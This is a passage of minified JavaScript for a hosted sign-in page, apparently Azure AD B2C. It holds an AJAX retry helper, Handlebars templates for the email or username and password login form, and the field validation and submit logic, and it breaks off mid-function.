e=e!==undefined?e:t,h=e.hosts.tenant+"/"+e.api+(f!==undefined?"/"+f:"")+"?tx="+e.transId+"&p="+e.hosts.policy,s={"X-CSRF-TOKEN":t.csrf},t.isPageViewIdSentWithHeader&&(s["x-ms-cpim-pageviewid"]=t.pageViewId),o=e.xhrSettings,$.ajax({type:"POST",dataType:"json",headers:s,retryMaxAttempts:o&&o.hasOwnProperty("retryMaxAttempts")?o.retryMaxAttempts:3,retryDelay:o&&o.hasOwnProperty("retryDelay")?o.retryDelay:200,retryExponent:o&&o.hasOwnProperty("retryExponent")?o.retryExponent:2,retryEnabled:o&&o.hasOwnProperty("retryEnabled")?o.retryEnabled:!1,retryOn:o&&o.hasOwnProperty("retryOn")?o.retryOn:[],retryAttempt:0,timeout:e.config.timeout||9e4,url:h,cache:!1,contentType:e.contentType!==undefined?e.contentType:"application/x-www-form-urlencoded; charset=UTF-8",data:n,success:i,error:function(n,t,i){var u,f,e;(this.retryEnabled===!1||this.retryOn.indexOf(t)===-1)&&r(n,t,i);u=window.navigator!==undefined&&window.navigator.onLine!==undefined?window.navigator.onLine:!0;f=new $trace("T030",!1);f.append(u?"Online":"Offline");$diags.trace(f);u===!1&&(this.retryAttempt<this.retryMaxAttempts?(this.retryAttempt++,this.retryDelay=this.retryAttempt===1?this.retryDelay:this.retryDelay*this.retryExponent,e=new $trace("T031",!1),e.append(" '"+t+": ' - retryAttempt: "+this.retryAttempt+" - retryDelay: "+this.retryDelay+" - retryExponent:"+this.retryExponent),$diags.trace(e),setTimeout(function(n){return $.ajax(n)},this.retryDelay,this)):($diags.trace(new $trace("T032",!1)),r(n,t,i)))},complete:u})},generateServiceContent:function(n,t){var i=Handlebars.templates[n];return i(t)},insertServiceContent:function(n){var i=$(n),t=$("#api"),r=t[0].attributes;t.replaceWith(i.html());$.each(r,function(){this.name!=="id"&&$("#api").attr(this.name,this.value)})},lookupLanguage:function(t){return n[t]},bindHost:function(n){return t.hosts.static+n},isSafari:function(){var n=navigator.userAgent.toLowerCase();if(n.indexOf("safari")!==-1)return n.indexOf("chrome")>-1?!1:!0}}}(CONTENT,SETTINGS),function(n,t){Handlebars.registerHelper("getContent",function(t){return new Handlebars.SafeString(n[t])});Handlebars.registerHelper("getHostQualfiedUrl",function(n){return t.hosts.static+n});Handlebars.registerHelper("isSettingTrue",function(n,i){var r=t.config[n];return r&&r.toLowerCase()==="true"?i.fn(this):null});Handlebars.registerHelper("isSettingEqual",function(n,i,r,u){for(var o=t.config[n]||r,e=i.split(","),s=e.length,f=0;f<s;f++)if(e[f]&&e[f].toLowerCase()===o.toLowerCase())return u.fn(this);return null});Handlebars.registerHelper("isSingle",function(n,t){return n.length===1?t.fn(this):null});Handlebars.registerHelper("isMultiple",function(n,t){return n.length>1?t.fn(this):null});Handlebars.registerHelper("getCountryDialingCodeOptionList",function(){var u="",e=t.locale.country,f=document.createElement("textarea"),r,n,i;f.innerHTML=$i2e.lookupLanguage("countryList");r=JSON.parse(f.value);for(n in r)i=$isoData.countryByIso[n].dc,u+="<option value='+"+i+(e===n?"' selected>":"'>")+r[n]+(i?" (+"+i+")":"")+"<\/option>";return u})}(CONTENT,SETTINGS);this.Handlebars=this.Handlebars||{};this.Handlebars.templates=this.Handlebars.templates||{};this.Handlebars.templates["unifiedssp-classic"]=Handlebars.template({1:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{},o=i.helperMissing;return'    <div class="social" aria-label="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"social_intro",{name:"getContent",hash:{},data:u}))?f:"")+'" role="form">\r\n      <div class="intro">\r\n        <h2>'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"social_intro",{name:"getContent",hash:{},data:u}))?f:"")+'<\/h2>\r\n      <\/div>\r\n      <div class="options">\r\n'+(null!=(f=i.each.call(e,null!=t?t.list:t,{name:"each",hash:{},fn:n.program(2,u,0),inverse:n.noop,data:u}))?f:"")+"      <\/div>\r\n    <\/div>\r\n\r\n"+(null!=(f=i.if.call(e,null!=t?t.AttributeFields:t,{name:"if",hash:{},fn:n.program(7,u,0),inverse:n.noop,data:u}))?f:"")},2:function(n,t,i,r,u){return"        <div>\r\n"+(null!=(u=i.if.call(null!=t?t:n.nullContext||{},u&&u.first,{name:"if",hash:{},fn:n.program(3,u,0),inverse:n.program(5,u,0),data:u}))?u:"")+"        <\/div>\r\n"},3:function(n,t){var i=n.lambda;return'          <button class="accountButton firstButton" id="'+(null!=(n=i(null!=t?t.id:t,t))?n:"")+'" >'+(null!=(n=i(null!=t?t.description:t,t))?n:"")+"<\/button>\r\n"},5:function(n,t){var i=n.lambda;return'          <button class="accountButton" id="'+(null!=(n=i(null!=t?t.id:t,t))?n:"")+'" >'+(null!=(n=i(null!=t?t.description:t,t))?n:"")+"<\/button>\r\n"},7:function(n,t,i,r,u){return'    <div class="divider">\r\n      <h2>'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"divider_title",{name:"getContent",hash:{},data:u}))?u:"")+"<\/h2>\r\n    <\/div>\r\n"},9:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{},o=i.helperMissing,s=n.lambda;return(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(10,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(12,u,0),inverse:n.noop,data:u}))?f:"")+'        <div class="intro">\r\n          <h2>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(14,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(16,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/h2>\r\n        <\/div>\r\n        <div class="error pageLevel" aria-hidden="true" role="alert">\r\n          <p><\/p>\r\n        <\/div>\r\n        <div class="entry">\r\n          <div class="entry-item">\r\n            <label for="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[0]:f)?f.ID:f,t))?f:"")+'">\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(18,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(20,u,0),inverse:n.noop,data:u}))?f:"")+'            <\/label>\r\n            <div class="error itemLevel" aria-hidden="true" role="alert">\r\n              <p><\/p>\r\n            <\/div>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(22,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(24,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/div>\r\n          <div class="entry-item">\r\n            <div class="password-label">\r\n              <label for="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.ID:f,t))?f:"")+'">'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+"<\/label>\r\n"+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterLabel","None",{name:"isSettingEqual",hash:{},fn:n.program(26,u,0),inverse:n.noop,data:u}))?f:"")+'            <\/div>\r\n            <div class="error itemLevel" aria-hidden="true">\r\n              <p role="alert"><\/p>\r\n            <\/div>\r\n            <input type="password" id="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.ID:f,t))?f:"")+'" name="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.DN:f,t))?f:"")+'" placeholder="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+'" aria-label="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+'"/>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterInput","None",{name:"isSettingEqual",hash:{},fn:n.program(28,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/div>\r\n          <div class="working"><\/div>\r\n'+(null!=(f=(i.isSettingTrue||t&&t.isSettingTrue||o).call(e,"enableRememberMe",{name:"isSettingTrue",hash:{},fn:n.program(30,u,0),inverse:n.noop,data:u}))?f:"")+'          <div class="buttons">\r\n            <button id="next" type="submit" form="localAccountForm">'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"button_signin",{name:"getContent",hash:{},data:u}))?f:"")+"<\/button>\r\n          <\/div>\r\n"+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterButtons","None",{name:"isSettingEqual",hash:{},fn:n.program(32,u,0),inverse:n.noop,data:u}))?f:"")+"        <\/div>\r\n"+(null!=(f=(i.isSettingTrue||t&&t.isSettingTrue||o).call(e,"showSignupLink",{name:"isSettingTrue",hash:{},fn:n.program(34,u,0),inverse:n.noop,data:u}))?f:"")+"      <\/form>\r\n"},10:function(n,t,i,r,u){return'    <form id="localAccountForm" action="JavaScript:void(0);" class="localAccount" aria-label="'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_email",{name:"getContent",hash:{},data:u}))?u:"")+'">\r\n'},12:function(n,t,i,r,u){return'    <form id="localAccountForm" action="JavaScript:void(0);" class="localAccount" aria-label="'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_username",{name:"getContent",hash:{},data:u}))?u:"")+'">\r\n'},14:function(n,t,i,r,u){return"            "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_email",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},16:function(n,t,i,r,u){return"            "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_username",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},18:function(n,t,i,r,u){return"              "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},20:function(n,t,i,r,u){return"              "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},22:function(n,t,i,r,u){var f=null!=t?t:n.nullContext||{},e=i.helperMissing,o=n.lambda;return'            <input type="email" title="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"email_tooltip",{name:"getContent",hash:{},data:u}))?n:"")+'" id="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.ID:n,t))?n:"")+'" name="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.DN:n,t))?n:"")+'" pattern="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"email_pattern",{name:"getContent",hash:{},data:u}))?n:"")+'" placeholder="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?n:"")+'" value="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.PRE:n,t))?n:"")+'" aria-label="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?n:"")+'"/>\r\n'},24:function(n,t,i,r,u){var f=n.lambda,e=null!=t?t:n.nullContext||{},o=i.helperMissing;return'            <input type="text" id="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.ID:n,t))?n:"")+'" name="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.DN:n,t))?n:"")+'" placeholder="'+(null!=(n=(i.getContent||t&&t.getContent||o).call(e,"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?n:"")+'" value="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.PRE:n,t))?n:"")+'" aria-label="'+(null!=(n=(i.getContent||t&&t.getContent||o).call(e,"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?n:"")+'"/>\r\n'},26:function(n,t,i,r,u){return'              <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n"},28:function(n,t,i,r,u){return'            <div class="forgot-password">\r\n              <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n            <\/div>\r\n"},30:function(n,t,i,r,u){return'          <div class="rememberMe">\r\n            <input id="rememberMe" type="checkbox" name="rememberMe"/>\r\n            <label for="rememberMe">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"remember_me",{name:"getContent",hash:{},data:u}))?u:"")+"<\/label>\r\n          <\/div>\r\n"},32:function(n,t,i,r,u){return'          <div class="forgot-password">\r\n            <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n          <\/div>\r\n"},34:function(n,t,i,r,u){var f=null!=t?t:n.nullContext||{},e=i.helperMissing;return'        <div class="divider">\r\n          <h2>'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"divider_title",{name:"getContent",hash:{},data:u}))?n:"")+'<\/h2>\r\n        <\/div>\r\n        <div class="create">\r\n          <p>\r\n            '+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"createaccount_intro",{name:"getContent",hash:{},data:u}))?n:"")+'<a id="createAccount">'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"createaccount_link",{name:"getContent",hash:{},data:u}))?n:"")+"<\/a>\r\n          <\/p>\r\n        <\/div>\r\n"},compiler:[7,">= 4.0.0"],main:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{};return'<script id="Unified" type="text/x-handlebars-template">\r\n  <div id="api" data-name="Unified">\r\n\r\n'+(null!=(f=i.if.call(e,null!=t?t.list:t,{name:"if",hash:{},fn:n.program(1,u,0),inverse:n.noop,data:u}))?f:"")+"\r\n"+(null!=(f=i.if.call(e,null!=t?t.AttributeFields:t,{name:"if",hash:{},fn:n.program(9,u,0),inverse:n.noop,data:u}))?f:"")+"    <\/div>\r\n  <\/script>"},useData:!0});this.Handlebars=this.Handlebars||{};this.Handlebars.templates=this.Handlebars.templates||{};this.Handlebars.templates["unifiedssp-modern"]=Handlebars.template({1:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{},o=i.helperMissing,s=n.lambda;return(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(2,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(4,u,0),inverse:n.noop,data:u}))?f:"")+'        <div class="intro">\r\n          <h2>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(6,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(8,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/h2>\r\n        <\/div>\r\n        <div class="error pageLevel" aria-hidden="true" role="alert">\r\n          <p><\/p>\r\n        <\/div>\r\n        <div class="entry">\r\n          <div class="entry-item">\r\n            <label for="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[0]:f)?f.ID:f,t))?f:"")+'">\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(10,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(12,u,0),inverse:n.noop,data:u}))?f:"")+'            <\/label>\r\n            <div class="error itemLevel" aria-hidden="true" role="alert">\r\n              <p><\/p>\r\n            <\/div>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Email","Email",{name:"isSettingEqual",hash:{},fn:n.program(14,u,0),inverse:n.noop,data:u}))?f:"")+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"operatingMode","Username","Username",{name:"isSettingEqual",hash:{},fn:n.program(16,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/div>\r\n          <div class="entry-item">\r\n            <div class="password-label">\r\n              <label for="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.ID:f,t))?f:"")+'">'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+"<\/label>\r\n"+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterLabel","None",{name:"isSettingEqual",hash:{},fn:n.program(18,u,0),inverse:n.noop,data:u}))?f:"")+'            <\/div>\r\n            <div class="error itemLevel" aria-hidden="true">\r\n              <p role="alert"><\/p>\r\n            <\/div>\r\n            <input type="password" id="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.ID:f,t))?f:"")+'" name="'+(null!=(f=s(null!=(f=null!=(f=null!=t?t.AttributeFields:t)?f[1]:f)?f.DN:f,t))?f:"")+'" placeholder="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+'"  aria-label="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"password",{name:"getContent",hash:{},data:u}))?f:"")+'"/>\r\n'+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterInput","None",{name:"isSettingEqual",hash:{},fn:n.program(20,u,0),inverse:n.noop,data:u}))?f:"")+'          <\/div>\r\n          <div class="working"><\/div>\r\n'+(null!=(f=(i.isSettingTrue||t&&t.isSettingTrue||o).call(e,"enableRememberMe",{name:"isSettingTrue",hash:{},fn:n.program(22,u,0),inverse:n.noop,data:u}))?f:"")+'          <div class="buttons">\r\n            <button id="next" type="submit" form="localAccountForm">'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"button_signin",{name:"getContent",hash:{},data:u}))?f:"")+"<\/button>\r\n          <\/div>\r\n"+(null!=(f=(i.isSettingEqual||t&&t.isSettingEqual||o).call(e,"forgotPasswordLinkLocation","AfterButtons","None",{name:"isSettingEqual",hash:{},fn:n.program(24,u,0),inverse:n.noop,data:u}))?f:"")+"        <\/div>\r\n"+(null!=(f=(i.isSettingTrue||t&&t.isSettingTrue||o).call(e,"showSignupLink",{name:"isSettingTrue",hash:{},fn:n.program(26,u,0),inverse:n.noop,data:u}))?f:"")+"    <\/form>\r\n"},2:function(n,t,i,r,u){return'    <form id="localAccountForm" action="JavaScript:void(0);" class="localAccount" aria-label="'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_email",{name:"getContent",hash:{},data:u}))?u:"")+'">\r\n'},4:function(n,t,i,r,u){return'    <form id="localAccountForm" action="JavaScript:void(0);" class="localAccount" aria-label="'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_username",{name:"getContent",hash:{},data:u}))?u:"")+'">\r\n'},6:function(n,t,i,r,u){return"            "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_email",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},8:function(n,t,i,r,u){return"            "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"local_intro_username",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},10:function(n,t,i,r,u){return"              "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},12:function(n,t,i,r,u){return"              "+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?u:"")+"\r\n"},14:function(n,t,i,r,u){var f=null!=t?t:n.nullContext||{},e=i.helperMissing,o=n.lambda;return'            <input type="email" title="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"email_tooltip",{name:"getContent",hash:{},data:u}))?n:"")+'" id="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.ID:n,t))?n:"")+'" name="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.DN:n,t))?n:"")+'" pattern="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"email_pattern",{name:"getContent",hash:{},data:u}))?n:"")+'" placeholder="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?n:"")+'" value="'+(null!=(n=o(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.PRE:n,t))?n:"")+'"  aria-label="'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"logonIdentifier_email",{name:"getContent",hash:{},data:u}))?n:"")+'"/>\r\n'},16:function(n,t,i,r,u){var f=n.lambda,e=null!=t?t:n.nullContext||{},o=i.helperMissing;return'            <input type="text" id="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.ID:n,t))?n:"")+'" name="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.DN:n,t))?n:"")+'" placeholder="'+(null!=(n=(i.getContent||t&&t.getContent||o).call(e,"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?n:"")+'" value="'+(null!=(n=f(null!=(n=null!=(n=null!=t?t.AttributeFields:t)?n[0]:n)?n.PRE:n,t))?n:"")+'"  aria-label="'+(null!=(n=(i.getContent||t&&t.getContent||o).call(e,"logonIdentifier_username",{name:"getContent",hash:{},data:u}))?n:"")+'"/>\r\n'},18:function(n,t,i,r,u){return'              <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n"},20:function(n,t,i,r,u){return'            <div class="forgot-password">\r\n              <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n            <\/div>\r\n"},22:function(n,t,i,r,u){return'          <div class="rememberMe">\r\n            <input id="rememberMe" type="checkbox" name="rememberMe"/>\r\n            <label for="rememberMe">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"remember_me",{name:"getContent",hash:{},data:u}))?u:"")+"<\/label>\r\n          <\/div>\r\n"},24:function(n,t,i,r,u){return'          <div class="forgot-password">\r\n            <a id="forgotPassword">'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"forgotpassword_link",{name:"getContent",hash:{},data:u}))?u:"")+"<\/a>\r\n          <\/div>\r\n"},26:function(n,t,i,r,u){var f=null!=t?t:n.nullContext||{},e=i.helperMissing;return'        <div class="divider">\r\n          <h2>'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"divider_title",{name:"getContent",hash:{},data:u}))?n:"")+'<\/h2>\r\n        <\/div>\r\n        <div class="create">\r\n          <p>\r\n            '+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"createaccount_intro",{name:"getContent",hash:{},data:u}))?n:"")+'<a id="createAccount">'+(null!=(n=(i.getContent||t&&t.getContent||e).call(f,"createaccount_link",{name:"getContent",hash:{},data:u}))?n:"")+"<\/a>\r\n          <\/p>\r\n        <\/div>\r\n"},28:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{},o=i.helperMissing;return(null!=(f=i.if.call(e,null!=t?t.AttributeFields:t,{name:"if",hash:{},fn:n.program(29,u,0),inverse:n.noop,data:u}))?f:"")+'    <div class="social" aria-label="'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"social_intro",{name:"getContent",hash:{},data:u}))?f:"")+'" role="form">\r\n      <div class="intro">\r\n        <h2>'+(null!=(f=(i.getContent||t&&t.getContent||o).call(e,"social_intro",{name:"getContent",hash:{},data:u}))?f:"")+'<\/h2>\r\n      <\/div>\r\n      <div class="options">\r\n'+(null!=(f=i.each.call(e,null!=t?t.list:t,{name:"each",hash:{},fn:n.program(31,u,0),inverse:n.noop,data:u}))?f:"")+"      <\/div>\r\n    <\/div>\r\n"},29:function(n,t,i,r,u){return'    <div class="divider">\r\n      <h2>'+(null!=(u=(i.getContent||t&&t.getContent||i.helperMissing).call(null!=t?t:n.nullContext||{},"divider_title",{name:"getContent",hash:{},data:u}))?u:"")+"<\/h2>\r\n    <\/div>\r\n"},31:function(n,t,i,r,u){return"        <div>\r\n"+(null!=(u=i.if.call(null!=t?t:n.nullContext||{},u&&u.first,{name:"if",hash:{},fn:n.program(32,u,0),inverse:n.program(34,u,0),data:u}))?u:"")+"        <\/div>\r\n"},32:function(n,t){var i=n.lambda;return'          <button class="accountButton firstButton" id="'+(null!=(n=i(null!=t?t.id:t,t))?n:"")+'" >'+(null!=(n=i(null!=t?t.description:t,t))?n:"")+"<\/button>\r\n"},34:function(n,t){var i=n.lambda;return'          <button class="accountButton" id="'+(null!=(n=i(null!=t?t.id:t,t))?n:"")+'" >'+(null!=(n=i(null!=t?t.description:t,t))?n:"")+"<\/button>\r\n"},compiler:[7,">= 4.0.0"],main:function(n,t,i,r,u){var f,e=null!=t?t:n.nullContext||{};return'<script id="Unified" type="text/x-handlebars-template">\r\n  <div id="api" data-name="Unified">\r\n'+(null!=(f=i.if.call(e,null!=t?t.AttributeFields:t,{name:"if",hash:{},fn:n.program(1,u,0),inverse:n.noop,data:u}))?f:"")+"\r\n"+(null!=(f=i.if.call(e,null!=t?t.list:t,{name:"if",hash:{},fn:n.program(28,u,0),inverse:n.noop,data:u}))?f:"")+"  <\/div>\r\n<\/script>"},useData:!0});$element=function(n,t,i){var r,f,o,u=!1,s=function(){var n=!1,t=document.getElementById("rememberMe");return t&&(n=t.checked),n},v=function(t){var e,o,c;if(u)return t.stopImmediatePropagation(),!1;u=!0;e=document.querySelectorAll("div .working");$(e).css("display","block");o=jQuery.extend(!0,{},i);o.api="SelfAsserted";c="request_type=RESPONSE&"+r.id+"="+encodeURIComponent(r.value)+"&"+f.id+"="+encodeURIComponent(f.value),function(t){$i2e.sendDataWithRetry(c,function(n){if(n.status==200){t.append("T010");var i=s();return $i2e.redirectToServer("confirmed?rememberMe="+i),!1}t.append(n.message);h(n.message)},function(n){t.append(n.text);h(n.text)},function(){u=!1;$(e).css("display","none");n.trace(t)},undefined,o)}(new $trace("T018",!0))},h=function(n){var i=$("#api .localAccount").children(".error.pageLevel");n?i.children("p:first").text(n):i.children("p:first").html(t.unknown_error);i.attr("aria-hidden","false");i.css("display","block")},e=function(n,t){var i=$(n).children(".error.itemLevel");i.children("p:first").html(t);i.attr("aria-hidden","false");i.css("display","block");$(n).children("input").addClass("highlightError")},c=function(){$("#api .error").css("display","none");$("#api .error").attr("aria-hidden","true");$("#api .highlightError").removeClass("highlightError")},l=function(n){var t=$(n).children(".error.itemLevel");t.attr("aria-hidden","true");t.css("display","none");$(n).children("input").removeClass("highlightError")},y=function(){var n,u;return(l(r.parentElement),!r.value)?(n=i.config.operatingMode==="Email"?t.requiredField_email:t.requiredField_username,e(r.parentElement,n),!1):r.pattern&&(u=new RegExp(r.pattern).exec(r.value),!u)?(e(r.parentElement,t.invalid_email),r.focus(),!1):!0},p=function(){return(l(f.parentElement),!f.value)?(e(f.parentElement,t.requiredField_password),!1):!0},w=function(n){var t=n.keyCode||n.which;return t===0||t===1||t===13||$(n.target).is("button")&&t===32},a=function(n){if(w(n)){c();var t=y(),i=p();t&&i&&v(n)}},b=function(){(function(t){if($("#api .accountButton").click(function(n){if(u)return n.stopImmediatePropagation(),!1;var 